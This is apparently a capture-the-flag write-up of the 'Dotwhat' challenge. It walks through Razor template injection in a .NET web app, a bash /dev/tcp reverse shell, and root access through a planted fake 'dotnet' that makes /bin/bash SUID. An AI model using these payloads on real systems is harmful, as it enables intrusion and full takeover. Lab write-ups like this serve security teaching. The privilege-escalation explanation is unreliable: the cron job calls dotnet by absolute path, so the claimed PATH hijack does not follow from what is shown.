# Dotwhat – Boot2Root (BrunnerCTF)

In this writeup, we’ll go through solving the **Dotwhat** Boot2Root challenge from **BrunnerCTF**.  
The target is a `.NET` web application, and we’ll exploit it step-by-step to gain user and root access.
![Image](images/Pasted%20image%2020250824164409.png)
<br/>

![Image](images/Pasted%20image%2020250824172856.png)
<br/>


---

## 1. Initial Recon
![Image](images/Pasted%20image%2020250824164640.png)
<br/>

After opening the website, we’re presented with a form that has **three input fields**.

Since the app is built with **.NET**, my first thought was to test for **XSS injection** and **SQL injection** in the fields, lets start with **XSS**.

I injected the following payload into each input to identify which one is vulnerable:
![Image](images/Pasted%20image%2020250824164817.png)
<br/>

```html
<script>alert("xss 1 or 2 or 3")</script>
```

After submitting, only the **Instruction** input field triggered the alert.  
This confirmed an **XSS vulnerability** due to raw HTML rendering.
![Image](images/Pasted%20image%2020250824164937.png)
<br/>
![Image](images/Pasted%20image%2020250824165004.png)
<br/>

---
## 2. From XSS to SSTI

By fingerprinting the application with **Wappalyzer**, we confirmed it’s a **.NET web app**.  
In .NET (Razor pages), server-side template injection (SSTI) is possible by using `@` syntax.
![Image](images/Pasted%20image%2020250824165106.png)
<br/>

I tested SSTI with a simple arithmetic payload:

```html
<script>
@(7 * 7)
</script>
```
![Image](images/Pasted%20image%2020250824165444.png)
<br/>

Looking at the **page source**, I saw the value `49` — proof that SSTI was working!  
This meant we could escalate from XSS → SSTI → RCE.
![Image](images/Pasted%20image%2020250824165615.png)
<br/>


---

## 3. Achieving Remote Code Execution

To determine the OS, I attempted to run `pwd`:

```html
<script>
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo = new System.Diagnostics.ProcessStartInfo("pwd");
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.Start();
    @proc.StandardOutput.ReadToEnd();
}
</script>
```
![Image](images/Pasted%20image%2020250824170349.png)
<br/>


The output confirmed we were on a **Linux host**.
![Image](images/Pasted%20image%2020250824170423.png)
<br/>

### Reverse Shell Payload

Next, I crafted a reverse shell payload to connect back to my attacker machine using ngrok:
![Image](images/Pasted%20image%2020250824170454.png)
<br/>
![Image](images/Pasted%20image%2020250824170555.png)
<br/>
![Image](images/Pasted%20image%2020250824170749.png)
<br/>


```html
<script>
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo = new System.Diagnostics.ProcessStartInfo("/bin/bash", "-c \"/bin/bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\"");
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.RedirectStandardError = true;
    proc.Start();
    @proc.StandardOutput.ReadToEnd()
    @proc.StandardError.ReadToEnd()
}
</script>
```

On my listener (`nc -lvnp 4444`), I received a shell as the **user**.
![Image](images/Pasted%20image%2020250824170929.png)
<br/>

---

## 4. User Flag

With the shell established:

```bash
cd ~
cat user.txt
```

Output:

```
brunner{Something here}
```

User flag captured ✅

---

## 5. Privilege Escalation

To escalate, I enumerated **SUID binaries**:

```bash
find find / -perm -4000 -o -perm -2000 -type f 2>/dev/null    
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd

```

Among them, `/usr/bin/crontab` stood out.

### Cron Exploit

Checking `/etc/cron.d/`, I found a custom cron job:

```bash
ls -la /etc/cron.d/          
total 12
drwxr-xr-x. 1 root root  14 Aug 23 19:11 .
drwxr-xr-x. 1 root root  12 Aug 23 19:11 ..
-rw-r--r--. 1 root root 102 Mar 31  2024 .placeholder
-rw-r--r--. 1 root root 201 Apr  8  2024 e2scrub_all
-rw-r--r--. 1 root root 189 Aug 23 19:11 migrate
cat /etc/cron.d/migrate    
* * * * * root cd /home/user/app && /usr/bin/dotnet ef database update >> /var/log/migrate.log 2>&1
```

Notice: The `PATH` includes `/opt/devtools` and the cron executes `dotnet`.  
Since `/opt/devtools/` is writable by our user, we can hijack it.

I created a malicious fake `dotnet` binary:

```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /opt/devtools/dotnet
chmod +x /opt/devtools/dotnet
```

After a minute, cron executed our payload and `/bin/bash` became SUID.

---

## 6. Root Shell & Flag

Now I spawned a root shell:

```bash
/bin/bash -p
id
```

```
uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user),100(users)
```

We are **root**!

Finally, retrieving the root flag:

```bash
cd /root
cat root.txt
```

Output:

```
brunner{SomethingSecret here}
```

Root flag captured ✅

---

## Conclusion

This challenge demonstrated a full attack chain:

1. **XSS → SSTI** in a .NET Razor app
    
2. **SSTI → RCE** with `System.Diagnostics.Process`
    
3. **Reverse shell** for initial foothold
    
4. **Cron + PATH hijacking** for privilege escalation
    
5. **Root access** obtained successfully
    

A neat and realistic Boot2Root machine! 🚩
